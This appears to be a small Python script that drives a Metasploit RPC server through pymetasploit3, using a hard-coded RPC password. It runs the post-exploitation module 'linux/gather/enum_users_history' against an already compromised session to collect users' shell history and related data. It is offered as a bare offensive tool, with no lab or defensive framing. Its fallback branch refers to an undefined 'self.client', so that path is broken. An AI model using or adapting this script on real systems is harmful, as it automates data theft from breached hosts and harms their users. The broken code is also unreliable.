from pymetasploit3.msfrpc import *



client = MsfRpcClient('WsNFyWBa', port=55552, ssl=False)

if client.sessions.list:
            module = client.modules.use('post', 'linux/gather/enum_users_history')
            print(module.description)
            print()

            if client.sessions.list:
                print(client.sessions.list)

            in1 = input('MSF Session [1] -> ').strip()
            if in1 != '' and in1 in client.sessions.list.keys():
                module['SESSION'] = int(in1)
            else:
                module['SESSION'] = int(list(client.sessions.list.keys())[0])
                print(f'WARM: Selected session doesnt exists. Selecting session {list(self.client.sessions.list.keys())[0]}')
            
            console = client.consoles.console()
            console.run_module_with_output(module)
            # module.execute()